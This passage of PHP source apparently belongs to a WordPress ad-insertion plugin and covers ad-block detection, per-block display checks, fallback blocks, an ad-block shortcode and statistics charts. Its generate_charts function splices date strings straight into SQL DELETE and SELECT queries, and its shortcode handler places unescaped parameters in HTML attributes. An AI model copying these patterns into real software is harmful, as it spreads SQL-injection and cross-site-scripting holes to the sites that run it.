        echo '<div id="adb-container" class="ai-dummy-ad" style="position:absolute; z-index: -100000; width: 500px; top: -1000px; left: -1000px;"><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><ins class="adsbygoogle" style="display:block;" data-ad-client="', defined ('AI_ADB_ADSENSE_AD_CLIENT') ? AI_ADB_ADSENSE_AD_CLIENT : 'ca-pub-dummy-ad-client-', '" data-ad-slot="', defined ('AI_ADB_ADSENSE_AD_SLOT') ? AI_ADB_ADSENSE_AD_SLOT : 'dummyadslot', '"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div>', "\n";
      }
      if (!defined ('AI_ADB_NO_GOOGLE_ANALYTICS')) {
        echo '<script async id="ai-adb-ga" src="https://www.google-analytics.com/analytics.js"></script>', "\n";
      }
//      echo '<script async src="//cdn.chitika.net/getads.js"></script>', "\n";
      if (!defined ('AI_ADB_NO_MEDIA_NET')) {
        echo '<script async id="ai-adb-mn" src="//contextual.media.net/dmedianet.js"></script>', "\n";
      }
      if (!defined ('AI_ADB_NO_ADS_JS')) {
        echo '<script async id="ai-adb-ads" src="', $script_url, AI_ADB_1_FILENAME.'?ver=', AD_INSERTER_VERSION . '-' . filemtime ($script_path.AI_ADB_1_FILENAME), '"></script>', "\n";
      }
      if (!defined ('AI_ADB_NO_SPONSORS_JS')) {
        echo '<script async id="ai-adb-sponsors" src="', $script_url, AI_ADB_2_FILENAME.'?ver=', AD_INSERTER_VERSION . '-' . filemtime ($script_path.AI_ADB_2_FILENAME), '"></script>', "\n";
      }
      if (!defined ('AI_ADB_NO_ADVERTISING_JS')) {
        echo '<script async id="ai-adb-advertising" src="', $script_url, AI_ADB_3_FILENAME.'?ver=', AD_INSERTER_VERSION . '-' . filemtime ($script_path.AI_ADB_3_FILENAME), '"></script>', "\n";
      }
      if (!defined ('AI_ADB_NO_ADVERTS_JS')) {
        echo '<script async id="ai-adb-adverts" src="', $script_url, AI_ADB_4_FILENAME.'?ver=', AD_INSERTER_VERSION . '-' . filemtime ($script_path.AI_ADB_4_FILENAME), '"></script>', "\n";
      }
      echo '<!--/noptimize-->', "\n";
      echo '<!-- Code for ad blocking detection END -->', "\n";
    }
  }
}

function add_footer_inline_scripts_2 () {
  global $ai_wp_data, $ai_adb_id, $block_object;
                                                                                                                                      // VIEWPORT separators or CHECK viewport
  if (get_dynamic_blocks () == AI_DYNAMIC_BLOCKS_CLIENT_SIDE_SHOW || get_dynamic_blocks () == AI_DYNAMIC_BLOCKS_CLIENT_SIDE_INSERT || $ai_wp_data [AI_CLIENT_SIDE_DETECTION] || $ai_wp_data [AI_CLIENT_SIDE_INSERTION]) {
    echo ai_get_js ('ai-ip');
  }

  if (defined ('AI_ADBLOCKING_DETECTION') && AI_ADBLOCKING_DETECTION) {
    if ($ai_wp_data [AI_ADB_DETECTION] && !isset ($ai_wp_data [AI_ADB_SHORTCODE_DISABLED])) {

      if (get_adb_detection () == AI_ADB_DETECTION_ADVANCED) {
        $upload_dir = wp_upload_dir();
        $script_path = $upload_dir ['basedir'] . '/ad-inserter/' . $ai_adb_id . '/';

        if (file_exists ($script_path . AI_ADB_FOOTER_FILENAME)) {
          echo ai_replace_js_data (file_get_contents ($script_path . AI_ADB_FOOTER_FILENAME));
        }
      } else {
          $code = ai_adb_code () . ai_adb_code_2 ();
          $code = str_replace ('AI_CONST_AI_ADB_1_NAME', AI_ADB_1_NAME, $code);
          $code = str_replace ('AI_CONST_AI_ADB_2_NAME', AI_ADB_2_NAME, $code);
          echo ai_replace_js_data ($code);
        }
    }
  }

  if ($ai_wp_data [AI_TRACKING] && !isset ($ai_wp_data [AI_TRACKING_SHORTCODE_DISABLED])) {
    echo ai_get_js ('ai-tracking');
  }
}

function ai_add_footer_html () {
  global $ai_wp_data;

  if (get_disable_block_insertions ()) return;

  if (isset ($ai_wp_data [AI_TRIGGER_ELEMENTS])) {
    foreach ($ai_wp_data [AI_TRIGGER_ELEMENTS] as $block => $data) {
      if (is_int ($data))
        echo '<div id="ai-position-'.$block.'" style="position: absolute; top: '.$data.'px;"></div>', "\n"; else
          echo '<div id="ai-position-'.$block.'" style="position: absolute;" data-ai-position-pc="'.$data.'"></div>', "\n";
    }
  }
}

function generate_alignment_css_2 () {
  $styles = array ();

  $styles [AI_ALIGNMENT_STICKY_LEFT]    = array (AI_TEXT_STICKY_LEFT,    get_main_alignment_css (AI_ALIGNMENT_CSS_STICKY_LEFT));
  $styles [AI_ALIGNMENT_STICKY_RIGHT]   = array (AI_TEXT_STICKY_RIGHT,   get_main_alignment_css (AI_ALIGNMENT_CSS_STICKY_RIGHT));
  $styles [AI_ALIGNMENT_STICKY_TOP]     = array (AI_TEXT_STICKY_TOP,     get_main_alignment_css (AI_ALIGNMENT_CSS_STICKY_TOP));
  $styles [AI_ALIGNMENT_STICKY_BOTTOM]  = array (AI_TEXT_STICKY_BOTTOM,  get_main_alignment_css (AI_ALIGNMENT_CSS_STICKY_BOTTOM));

  return $styles;
}

function ai_check_separators ($obj, $processed_code) {
  global $ai_wp_data;

  if (strpos ($processed_code, AD_CHECK_SEPARATOR) !== false) {
    $check_codes = explode (AD_CHECK_SEPARATOR, $processed_code);

    if (trim ($check_codes [0]) == '') {
      unset ($check_codes [0]);
      $check_codes = array_values ($check_codes);
    } else array_unshift ($ai_wp_data [AI_SHORTCODES]['check'],  array ());

    $obj->check_codes = $check_codes;

    if ($ai_wp_data [AI_FORCE_SERVERSIDE_CODE]) {
      // Code for preview
      if ($obj->check_index >= count ($check_codes)) {
        $obj->check_index = 0;
      }
      $obj->check_codes_index = $obj->check_index;
    } else $obj->check_codes_index = 0;

    $obj->check_codes_data = $ai_wp_data [AI_SHORTCODES]['check'];

    if ($ai_wp_data [AI_FORCE_SERVERSIDE_CODE] && is_array ($obj->check_codes_data)) {
      $obj->check_names = array ();
      foreach ($obj->check_codes_data as $index => $check_data) {
        $check_name = '';
        foreach ($check_data as $check_type => $check_list) {
          if ($check_list != '') {
            $check_name .= ' '. $check_type . '="' . $check_list . '"';
          }
        }
        if ($check_name == '') $check_name = $index + 1;
        $obj->check_names []= $check_name;
      }
    }

    $processed_code = $check_codes [$obj->check_codes_index];
  }

  $obj->check_code_empty = false;
  if (!$ai_wp_data [AI_FORCE_SERVERSIDE_CODE] && is_array ($obj->check_codes_data) && isset ($obj->check_codes_data [$obj->check_codes_index])) {
    $check_data = '';

    $server_side_check = $obj->server_side_check ();
    $debug_processing = ($ai_wp_data [AI_WP_DEBUGGING] & AI_DEBUG_PROCESSING) != 0;

    if ($debug_processing) {
      if (is_array ($obj->check_codes_data) && isset ($obj->check_codes_data [$obj->check_codes_index])) {
        $check_log_text = '';
        foreach ($obj->check_codes_data [$obj->check_codes_index] as $check_type => $check_list) {
          if ($check_list != '') {
            $check_log_text .= ' '. $check_type . '="' . $check_list . '"';
          }
        }
        ai_log ('BLOCK ' . $obj->number . ' CHECK [' . trim ($check_log_text) . ']');
      }
    }

    unset ($obj->check_url_parameters);
    unset ($obj->check_url_parameter_list_type);
    unset ($obj->check_referers);
    unset ($obj->check_referers_list_type);
    unset ($obj->check_clients);
    unset ($obj->check_clients_list_type);
    unset ($obj->check_ip_addresses);
    unset ($obj->check_ip_addresses_list_type);
    unset ($obj->check_countries);
    unset ($obj->check_countries_list_type);

    $obj->check_code_empty = true;
    foreach ($obj->check_codes_data [$obj->check_codes_index] as $check_type => $check_list) {
      if ($check_list != '') {
        if ($check_list [0] == '^') {
          $list_type = AI_BLACK_LIST;
          $check_list = substr ($check_list, 1);
        } else $list_type = AI_WHITE_LIST;

        if ($debug_processing) $single_check_log_text = 'BLOCK ' . $obj->number . ' CHECK ' . ($list_type == AI_WHITE_LIST ? '[W] ' : '[B] ') . $check_type . '=\'' . $check_list . '\'';

        switch ($check_type) {
          case 'category':
            if (!$obj->check_category ($check_list, $list_type)) {
              if ($debug_processing) ai_log ($single_check_log_text . ' FAILED');
              return '';
            }
            if ($debug_processing) ai_log ($single_check_log_text);
            break;
          case 'tag':
            if (!$obj->check_tag ($check_list, $list_type)) {
              if ($debug_processing) ai_log ($single_check_log_text . ' FAILED');
              return '';
            }
            if ($debug_processing) ai_log ($single_check_log_text);
            break;
          case 'taxonomy':
            if (!$obj->check_taxonomy ($check_list, $list_type)) {
              if ($debug_processing) ai_log ($single_check_log_text . ' FAILED');
              return '';
            }
            if ($debug_processing) ai_log ($single_check_log_text);
            break;
          case 'id':
            if (!$obj->check_id ($check_list, $list_type)) {
              if ($debug_processing) ai_log ($single_check_log_text . ' FAILED');
              return '';
            }
            if ($debug_processing) ai_log ($single_check_log_text);
            break;
          case 'url':
            if (!$obj->check_url ($check_list, $list_type)) {
              if ($debug_processing) ai_log ($single_check_log_text . ' FAILED');
              return '';
            }
            if ($debug_processing) ai_log ($single_check_log_text);
            break;
          case 'viewport':
            $obj->check_viewports           = $check_list;
            $obj->check_viewports_list_type = $list_type;
            break;
          case 'url-parameter':
            switch ($server_side_check) {
              case true:
                if (!check_url_parameter_and_cookie_list ($check_list, $list_type == AI_WHITE_LIST)) {
                  if ($debug_processing) ai_log ($single_check_log_text . ' FAILED');
                  return '';
                }
                if ($debug_processing) ai_log ($single_check_log_text);
                break;
              default:
//                $client_side_list_check = $obj->client_side_cookie_check && ($obj->get_url_parameter_list () != '' /*|| $obj->get_url_parameter_list_type () == AI_WHITE_LIST*/);
//                if (!$client_side_list_check) {
                  $obj->client_side_cookie_check = false;
                  $url_parameter_found = false;
                  $url_parameter_list_pass = check_url_parameter_list ($check_list, $list_type == AI_WHITE_LIST, $url_parameter_found);

                  if ($url_parameter_found && !$url_parameter_list_pass) return '';

                  if (!$url_parameter_found) $obj->client_side_cookie_check = true;

                  $obj->check_url_parameters           = $check_list;
                  $obj->check_url_parameter_list_type  = $list_type;
//                } else {
//                    if ($debug_processing) ai_log ($single_check_log_text . ' NOT CHECKED - CLIENT SIDE LIST CHECK');
//                  }
                break;
            }
            break;
          case 'referrer':
            switch ($server_side_check) {
              case true:
                if (!check_referer_list ($check_list, $list_type == AI_WHITE_LIST)) {
                  if ($debug_processing) ai_log ($single_check_log_text . ' FAILED');
                  return '';
                }
                if ($debug_processing) ai_log ($single_check_log_text);
                break;
              default:
//                $client_side_list_check = $obj->get_ad_domain_list () != ''/* || $obj->get_ad_domain_list_type () == AI_WHITE_LIST*/;
//                if (!$client_side_list_check) {
                  $obj->check_referers           = $check_list;
                  $obj->check_referers_list_type = $list_type;
//                } else {
//                    if ($debug_processing) ai_log ($single_check_log_text . ' NOT CHECKED - CLIENT SIDE LIST CHECK');
//                  }
                break;
            }
            break;
          case 'client':
            switch ($server_side_check) {
              case true:
                if (!check_client_list ($check_list, $list_type == AI_WHITE_LIST)) {
                  if ($debug_processing) ai_log ($single_check_log_text . ' FAILED');
                  return '';
                }
                if ($debug_processing) ai_log ($single_check_log_text);
                break;
              default:
//                $client_side_list_check = $obj->get_client_list () != '' /*|| $obj->get_client_list_type () == AI_WHITE_LIST*/;
//                if (!$client_side_list_check) {
                  $obj->check_clients           = $check_list;
                  $obj->check_clients_list_type = $list_type;
//                } else {
//                    if ($debug_processing) ai_log ($single_check_log_text . ' NOT CHECKED - CLIENT SIDE LIST CHECK');
//                  }
                break;
            }
            break;
          case 'ip-address':
            if (function_exists ('ai_check_geo_settings')) {
              switch ($server_side_check) {
                case true:
                  require_once AD_INSERTER_PLUGIN_DIR.'includes/geo/Ip2Country.php';
                  ai_check_geo_settings ();

                  if (function_exists ('check_ip_address_list')) {
                    if (!check_ip_address_list ($check_list, $list_type == AI_WHITE_LIST)) {
                      if ($debug_processing) ai_log ($single_check_log_text . ' FAILED');
                      return '';
                    }
                    if ($debug_processing) ai_log ($single_check_log_text);
                  }
                  break;
                default:
//                  $client_side_list_check = $obj->get_ad_ip_address_list () != '' /*|| $obj->get_ad_ip_address_list_type () == AI_WHITE_LIST*/;
//                  if (!$client_side_list_check) {
                    $obj->check_ip_addresses           = $check_list;
                    $obj->check_ip_addresses_list_type = $list_type;
//                  } else {
//                      if ($debug_processing) ai_log ($single_check_log_text . ' NOT CHECKED - CLIENT SIDE LIST CHECK');
//                    }
                  break;
              }
            }
            break;
          case 'country':
            if (function_exists ('ai_check_geo_settings')) {
              switch ($server_side_check) {
                case true:
                  require_once AD_INSERTER_PLUGIN_DIR.'includes/geo/Ip2Country.php';
                  ai_check_geo_settings ();

                  if (function_exists ('check_country_list')) {
                    if (!check_country_list ($check_list, $list_type == AI_WHITE_LIST)) {
                      if ($debug_processing) ai_log ($single_check_log_text . ' FAILED');
                      return '';
                    }
                    if ($debug_processing) ai_log ($single_check_log_text);
                  }
                  break;
                default:
//                  $client_side_list_check = $obj->get_ad_country_list (true) != '' /*|| $obj->get_ad_country_list_type () == AI_WHITE_LIST*/;
//                  if (!$client_side_list_check) {
                    $obj->check_countries           = $check_list;
                    $obj->check_countries_list_type = $list_type;
//                  } else {
//                      if ($debug_processing) ai_log ($single_check_log_text . ' NOT CHECKED - CLIENT SIDE LIST CHECK');
//                    }
                  break;
              }
            }
            break;
        }
      }
    }
    $obj->check_code_empty = false;
    $obj->check_code_insertions ++;
    if ($debug_processing) ai_log ('BLOCK ' . $obj->number . ' INSERTED CEHCK [' . trim ($check_log_text) . ']');
  }

  return $processed_code;
}
                                     /* NOT USED ? */
function ai_adb_block_actions ($obj, $hide_label = false) {
  global $block_object, $ai_wp_data, $ad_inserter_globals;

  if (defined ('AI_ADBLOCKING_DETECTION') && AI_ADBLOCKING_DETECTION) {

    switch ($obj->get_adb_block_action ()) {
      case AI_ADB_BLOCK_ACTION_REPLACE:

          $globals_name = AI_ADB_FALLBACK_DEPTH_NAME;
          if (!isset ($ad_inserter_globals [$globals_name])) {
            $ad_inserter_globals [$globals_name] = 0;
          }

          $fallback_block = $obj->get_adb_block_replacement ();
          if ($fallback_block != '' && $fallback_block != 0 && $fallback_block <= 96 && $fallback_block != $obj->number && $ad_inserter_globals [$globals_name] < 2) {
            $ad_inserter_globals [$globals_name] ++;

            $adb_label = '';
            $no_adb_label = '';

            if (($ai_wp_data [AI_WP_DEBUGGING] & AI_DEBUG_BLOCKS) != 0) {
              $debug_adb_on   = new ai_block_labels ('ai-debug-adb-status on');
              $debug_adb_off  = new ai_block_labels ('ai-debug-adb-status off');

              $adb_label =
                $debug_adb_on->adb_hidden_section_start () .
                $debug_adb_on->center_bar    (__('AD BLOCKING', 'ad-inserter')) .
                $debug_adb_on->message (__('BLOCK INSERTED BUT NOT VISIBLE', 'ad-inserter')) .
                $debug_adb_on->adb_hidden_section_end ();

              $no_adb_label = $debug_adb_off->center_bar (__('NO AD BLOCKING', 'ad-inserter'));
            }

            $obj->additional_code_before = $adb_label . "<div class='ai-adb-hide' data-ai-debug='$obj->number'>\n" . $no_adb_label . $obj->additional_code_before;
            $obj->additional_code_after .= "</div>\n";

            if ($ai_wp_data [AI_W3TC_DEBUGGING]) {
              $obj->w3tc_debug []= 'PROCESS ADB REPLACEMENT';
            }

            $fallback_obj = $block_object [$fallback_block];
            $fallback_obj->hide_debug_labels = true;
            $fallback_code = $fallback_obj->ai_getProcessedCode ();
            $fallback_obj->hide_debug_labels = false;

            if ($fallback_obj->w3tc_code != '' && get_dynamic_blocks () == AI_DYNAMIC_BLOCKS_SERVER_SIDE_W3TC && !defined ('AI_NO_W3TC')) {
//              $fallback_code = "[#AI_CODE2#]";
              $fallback_obj->w3tc_code = 'ai_w3tc_log_run (\'PROCESS ADB REPLACEMENT BLOCK '.$fallback_block.'\');' . $fallback_obj->w3tc_code;
              $fallback_code = $fallback_obj->generate_html_from_w3tc_code ();
            }

            $fallback_no_adb_label = '';

            if (($ai_wp_data [AI_WP_DEBUGGING] & AI_DEBUG_BLOCKS) != 0) {
              $title = '';
              $counters = $fallback_obj->ai_get_counters ($title);

              $version_name = $fallback_obj->version_name == '' ? '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' : ' - ' . $fallback_obj->version_name;

              $fallback_block_name = $fallback_obj->number . ' ' . $fallback_obj->get_ad_name () . '<kbd data-separator=" - " class="ai-option-name">' . $version_name . '</kbd>';

//              if ($counters == '') {         // Taking up two bars
//                $counters = '<kbd class="ai-debug-visibility-hidden">' . $fallback_block_name . '</kbd>';
//                $title = '';
//              }

              $debug_fallback = new ai_block_labels ('ai-debug-fallback');

              $fallback_no_adb_label  =
                $debug_fallback->adb_visible_section_start () .
                $debug_fallback->block_start () .
//                $debug_fallback->bar ($fallback_block_name, '', __('AD BLOCKING REPLACEMENT', 'ad-inserter'), '<span class="ai-debug-visibility-hidden">' . $fallback_block_name . '</span>') .
                $debug_fallback->bar ($fallback_block_name, '', __('AD BLOCKING REPLACEMENT', 'ad-inserter')) .
                $debug_fallback->message (__('BLOCK INSERTED BUT NOT VISIBLE', 'ad-inserter')) .
                $debug_fallback->block_end () .
                $debug_fallback->adb_visible_section_end ();

              $fallback_code =
                $debug_fallback->block_start () .
                $debug_fallback->bar ($fallback_block_name, '', __('AD BLOCKING REPLACEMENT', 'ad-inserter'), $counters, $title) .
                '<div class="ai-code">' . $fallback_code . '</div>'.
                $debug_fallback->block_end ();
            }

            // Deprecated
//            $fallback_tracking = $fallback_obj->get_tracking () ? '' : ' ai-no-tracking';
            $fallback_tracking_block = $fallback_obj->get_tracking () ? $fallback_obj->number : 0;

            if (get_dynamic_blocks () == AI_DYNAMIC_BLOCKS_CLIENT_SIDE_INSERT) {
              $fallback_base64_code = ' data-code="' . base64_encode ($fallback_code) . '"';
              $fallback_code = '';
            } else $fallback_base64_code = '';


            if ($fallback_obj->w3tc_code != '' && get_dynamic_blocks () == AI_DYNAMIC_BLOCKS_SERVER_SIDE_W3TC && !defined ('AI_NO_W3TC')) {
              $tracking_data = '[#AI_DATA_TRACKING#]';
            } else {
                $tracking_data = base64_encode ("[{$fallback_tracking_block},{$fallback_obj->code_version},\"{$fallback_obj->get_ad_name ()}\",\"{$fallback_obj->version_name}\"]");
              }

            $additional_code_before_fallback = $fallback_no_adb_label .
//              "<div class='ai-adb-show$fallback_tracking' style='visibility: hidden; display: none;' data-ai-tracking='" . $tracking_data . "' data-ai-debug='$obj->number <= $fallback_obj->number'{$fallback_base64_code}>\n";
              "<div class='ai-adb-show' style='visibility: hidden; display: none;' data-ai-tracking='" . $tracking_data . "' data-ai-debug='$obj->number <= $fallback_obj->number'{$fallback_base64_code}>\n";

            $additional_code_after_fallback = "</div>\n";

            $obj->additional_code_after .= $additional_code_before_fallback . $fallback_code . $additional_code_after_fallback;

            if ($fallback_obj->w3tc_code != '' && get_dynamic_blocks () == AI_DYNAMIC_BLOCKS_SERVER_SIDE_W3TC && !defined ('AI_NO_W3TC')) {
              // Generate code to update tracking data
              $fallback_obj->regenerate_w3tc_code ($obj->additional_code_after);
              $fallback_obj->w3tc_code .= ' $ai_code = str_replace (\'[#AI_DATA_TRACKING#]\', base64_encode (\'[' . $fallback_tracking_block . ',\'.$ai_index.\']\'), $ai_code);';
              $obj->additional_code_after = $fallback_obj->generate_html_from_w3tc_code ();

              // TEST
//              if ($ai_wp_data [AI_W3TC_DEBUGGING]) {
//                array_unshift ($fallback_obj->w3tc_debug,  'FALLBACK BLOCK ' . $fallback_block);
//                $fallback_obj->w3tc_debug []= 'FALLBACK BLOCK END';

//                $this->w3tc_debug = array_merge ($this->w3tc_debug, $fallback_obj->w3tc_debug);
//              }
            }

            $ad_inserter_globals [$globals_name] --;
          }

        break;
      case AI_ADB_BLOCK_ACTION_SHOW:
        $no_adb_label = '';
        $adb_label    = '';

        // By default prevent tracking
        $obj->code_version = '""';

        if (($ai_wp_data [AI_WP_DEBUGGING] & AI_DEBUG_BLOCKS) != 0) {
          $debug_adb_on   = new ai_block_labels ('ai-debug-adb-status on');
          $debug_adb_off  = new ai_block_labels ('ai-debug-adb-status off');

          $no_adb_label =
            $debug_adb_off->adb_visible_section_start () .
            $debug_adb_off->invisible_start () .
            $debug_adb_off->center_bar (__('NO AD BLOCKING', 'ad-inserter')) .
            $debug_adb_off->message (__('BLOCK INSERTED BUT NOT VISIBLE', 'ad-inserter')) .
            $debug_adb_off->invisible_end () .
            $debug_adb_off->adb_visible_section_end ();

          $adb_label =
            $debug_adb_on->invisible_start () .
            $debug_adb_on->center_bar (__('AD BLOCKING', 'ad-inserter')) .
            $debug_adb_on->invisible_end ();

        }

        $obj->additional_code_before = $no_adb_label . "<div class='ai-adb-show' style='visibility: hidden; display: none;' data-ai-tracking='" . base64_encode ("[{$obj->number},\"\",\"{$obj->get_ad_name ()}\",\"{$obj->version_name}\"]") . "' data-ai-debug='$obj->number'>\n" . $adb_label;
        $obj->additional_code_after  .= "</div>\n";

        break;
      case AI_ADB_BLOCK_ACTION_HIDE:
        $no_adb_label = '';
        $adb_label    = '';

        if (($ai_wp_data [AI_WP_DEBUGGING] & AI_DEBUG_BLOCKS) != 0) {
          $debug_adb_on   = new ai_block_labels ('ai-debug-adb-status on');
          $debug_adb_off  = new ai_block_labels ('ai-debug-adb-status off');

          $adb_label =
            $debug_adb_on->adb_hidden_section_start () .
            $debug_adb_on->invisible_start () .
            $debug_adb_on->center_bar (__('AD BLOCKING', 'ad-inserter')) .
            $debug_adb_on->message (__('BLOCK INSERTED BUT NOT VISIBLE', 'ad-inserter')) .
            $debug_adb_on->invisible_end () .
            $debug_adb_on->adb_hidden_section_end ();

          $no_adb_label =
            $debug_adb_off->invisible_start () .
            $debug_adb_off->center_bar (__('NO AD BLOCKING', 'ad-inserter')) .
            $debug_adb_off->invisible_end ();
        }

        $obj->additional_code_before = $adb_label . "<div class='ai-adb-hide' data-ai-debug='$obj->number'>\n" . $no_adb_label;
        $obj->additional_code_after  .= "</div>\n";
        break;
    }
  }
}

function ai_shortcode ($parameters) {
  if (($adb = trim ($parameters ['adb'])) != '') {
    $css_attr = "";
    if (($css = trim ($parameters ['css'])) != '') {
      $css_attr = " data-css='$css'";
    }
    $text_attr = "";
    if (($text = trim ($parameters ['text'])) != '') {
      $text_attr = " data-text='$text'";
    }
    $selectors_attr = "";
    if (($selectors = trim ($parameters ['selectors'])) != '') {
      $selectors_attr = " data-selectors='$selectors'";
    }
    switch ($adb) {
      case 'hide':
        return  "<span class='" . AI_ADB_CONTENT_CSS_BEGIN ."'{$selectors_attr}></span>";
        break;
      case 'hide-end':
        return  "<span class='" . AI_ADB_CONTENT_CSS_END ."'></span>";
        break;
      case 'css':
        return  "<span class='" . AI_ADB_CONTENT_CSS_BEGIN ."'{$css_attr}{$selectors_attr}></span>";
        break;
      case 'css-end':
        return  "<span class='" . AI_ADB_CONTENT_CSS_END ."'></span>";
        break;
      case 'delete':
        return  "<span class='" . AI_ADB_CONTENT_DELETE_BEGIN ."'{$selectors_attr}></span>";
        break;
      case 'delete-end':
        return  "<span class='" . AI_ADB_CONTENT_DELETE_END ."'></span>";
        break;
      case 'replace':
        return  "<span class='" . AI_ADB_CONTENT_REPLACE_BEGIN ."'{$text_attr}{$css_attr}{$selectors_attr}></span>";
        break;
      case 'replace-end':
        return  "<span class='" . AI_ADB_CONTENT_REPLACE_END ."'></span>";
        break;
    }
  }
}

function generate_charts ($block, $start_date, $end_date, $adb, $delete) {
  global $ai_db_options, $ai_wp_data, $block_object, $wpdb;

  if (is_numeric ($block) && $block >= 0 && $block <= 96 && isset ($start_date) && isset ($end_date) && $start_date <= $end_date) {

    $gmt_offset = get_option ('gmt_offset') * 3600;
    $today = date ("Y-m-d", time () + $gmt_offset);

    $date_start = $start_date;
    $date_end   = $end_date;

    $date_end_time    = strtotime ($date_end);
    $date_start_time  = strtotime ($date_start);

    $pageview_statistics = $block == 0;

    if (!$pageview_statistics) {
      $obj = $block_object [$block];
      $block_name = $obj->get_ad_name ();
    } else $block_name = __("Pageviews", 'ad-inserter');

    $adb_statistics = isset ($adb) && $adb == 1 || $pageview_statistics && $ai_wp_data [AI_ADB_DETECTION];
//      $adb_statistics = false;

    $message = '';

    if (isset ($delete) && $delete == 1) {

      if ($date_start == '' && $date_end == '') {
        $wpdb->query ("DELETE FROM " . AI_STATISTICS_DB_TABLE . " WHERE block = " . $block);
        $message = __("All statistics data for block $block deleted", 'ad-inserter');
      } else {
          if (abs ($date_start_time - time ()) < 800 * 24 * 3600 && abs ($date_end_time - time ()) < 800 * 24 * 3600) {
            $wpdb->query ("DELETE FROM " . AI_STATISTICS_DB_TABLE . " WHERE block = " . $block . " AND date >= '$date_start' AND date <= '$date_end' ");
            $message = __("Statistics data between $date_start and $date_end deleted", 'ad-inserter');
          }
        }
    }

    if ($date_start_time < time () - 800 * 24 * 3600) {
      $date_start = $today;
      $date_start_time  = strtotime ($date_start);
    }

    if ($date_end_time < time () - 800 * 24 * 3600) {
      $date_end = $date_end;
      $date_end_time    = strtotime ($date_end);
    }

    $days = ($date_end_time - $date_start_time) / 24 / 3600 + 1;

    if ($days > 365 ) {
      $days = 365;
      $date_start = date ("Y-m-d", $date_end_time - 365 * 24 * 3600);
      $date_start_time  = strtotime ($date_start);
    } elseif ($days < 1 ) {
      $days = 1;
      $date_end = date ("Y-m-d", $date_start_time - 1 * 24 * 3600);
      $date_end_time  = strtotime ($date_end);
    }

    $date_start = date ("Y-m-d", strtotime ($date_start) - AI_STATISTICS_AVERAGE_PERIOD * 24 * 3600);

    $chart_data = array ();
    $day_time = $date_start_time - AI_STATISTICS_AVERAGE_PERIOD * 24 * 3600;
    $days_to_do = $days + AI_STATISTICS_AVERAGE_PERIOD;
    while ($days_to_do != 0) {
      $chart_data [date ("Y-m-d", $day_time)] = array (0, 0);
      $day_time += 24 * 3600;
      $days_to_do --;
    }

    $first_date = $date_end;
    $last_date  = $date_start;

    $results = $wpdb->get_results ('SELECT * FROM ' . AI_STATISTICS_DB_TABLE . ' WHERE block = ' . $block . " AND date >= '$date_start' AND date <= '$date_end' ", ARRAY_N);

    $versions = array ();
    $chart_data_total = $chart_data;
    $chart_data_versions = array ();

    if (isset ($results [0])) {

      foreach ($results as $result) {
        $version = $result [2] & AI_ADB_VERSION_MASK;

        if (($result [2] & AI_ADB_FLAG_BLOCKED) != 0) {
          if (!$pageview_statistics)
            if ($adb_statistics) $version = AI_ADB_FLAG_BLOCKED; else continue;
        }

        if (!in_array ($version, $versions)) {
          $versions []= $version;
          $chart_data_versions [$version] = $chart_data;
        }
      }

      usort ($versions, "compare_versions");
      ksort ($chart_data_versions);

      foreach ($results as $result) {
        $version = $result [2] & AI_ADB_VERSION_MASK;
        $date = $result [3];
        $views = $result [4];
        $clicks = $result [5];

        if (($result [2] & AI_ADB_FLAG_BLOCKED) != 0) {
          if ($pageview_statistics) {
            $clicks = $views;
          } else {
            if ($adb_statistics) $version = AI_ADB_FLAG_BLOCKED; else continue;
          }
        }

//          $result [4] = rand (4, 10);
//          $result [5] = rand (4, 10);

        if ($date < $first_date) $first_date = $date;
        if ($date > $last_date) $last_date = $date;
        if (isset ($chart_data_total [$date])) {
          $chart_data_total [$date] = array ($chart_data_total [$date][0] + $views, $chart_data_total [$date][1] + $clicks);
        }
        if (isset ($chart_data_versions [$version][$date])) {
          $chart_data_versions [$version][$date] = array ($chart_data_versions [$version][$date][0] + $views, $chart_data_versions [$version][$date][1] + $clicks);
        }
      }
    }

    $show_versions = count ($versions) > 1 || (count ($versions) == 1 && $versions [0] != 0);

    if ($show_versions) {

      $processed_chart_data_versions = array ();
      foreach ($chart_data_versions as $version => $chart_data_version) {
        $impressions          = array ();
        $clicks               = array ();
        $ctr                  = array ();
        $average_impressions  = array ();
        $average_clicks       = array ();
        $average_ctr          = array ();

        calculate_chart_data ($chart_data_version, $date_start, $date_end, $first_date, $impressions, $clicks, $ctr, $average_impressions, $average_clicks, $average_ctr);
        $processed_chart_data_versions [$version] = array ($impressions, $clicks, $ctr, $average_impressions, $average_clicks, $average_ctr);
      }

//        if (!isset ($chart_data_versions [0])) {
//          $null = array_fill (0, count ($processed_chart_data_versions [$version][0]), null);
//          $processed_chart_data_versions [0] = array ($null, $null, $null, $null, $null, $null);
//        }

      $only_blocked_version = $adb_statistics && count ($versions) == 2 && $versions [0] == AI_ADB_FLAG_BLOCKED && $versions [1] == 0;

      if (!$pageview_statistics) {
        $code_generator = new ai_code_generator ();

//          $rotation_data = $code_generator->import_rotation ($obj->get_ad_data()) ['options'];

        $obj = $block_object [$block];
        $rotation_data = $code_generator->import_rotation ($obj->get_ad_data());
        $rotation_data = $rotation_data ['options'];
      }

      $legend_data = array ();
      $legends = array ();
      foreach ($versions as $version) {
        if     ($version == 0)                    $legend = $pageview_statistics ? _x('Unknown', 'Version', 'ad-inserter')         : ($only_blocked_version ? _x('DISPLAYED', 'Times', 'ad-inserter') : __('No version', 'ad-inserter'));
        elseif ($version == AI_ADB_FLAG_BLOCKED)  $legend = $pageview_statistics ? __('Ad Blocking', 'ad-inserter')                : _x('BLOCKED', 'Times', 'ad-inserter');
        else                                      $legend = $pageview_statistics ? get_viewport_name ($version) : (
          isset ($rotation_data [$version - 1]['name']) && trim ($rotation_data [$version - 1]['name']) != '' ? str_replace ("'", "&#39;", $rotation_data [$version - 1]['name']) : chr (ord ('A') + $version - 1)
        );

        $legends [] = $legend;

        $legend_data ['serie'.($version + 1)] = $legend;
      }
    }

    $impressions          = array ();
    $clicks               = array ();
    $ctr                  = array ();
    $average_impressions  = array ();
    $average_clicks       = array ();
    $average_ctr          = array ();

    calculate_chart_data ($chart_data_total, $date_start, $date_end, $first_date, $impressions, $clicks, $ctr, $average_impressions, $average_clicks, $average_ctr);

    $labels = array ();
    foreach ($chart_data as $date => $data) {
      $date_elements = explode ('-', $date);

      $page_width = 690;

      if ($date_elements [2] == '01') {
        if ($date_elements [1] == '01') {
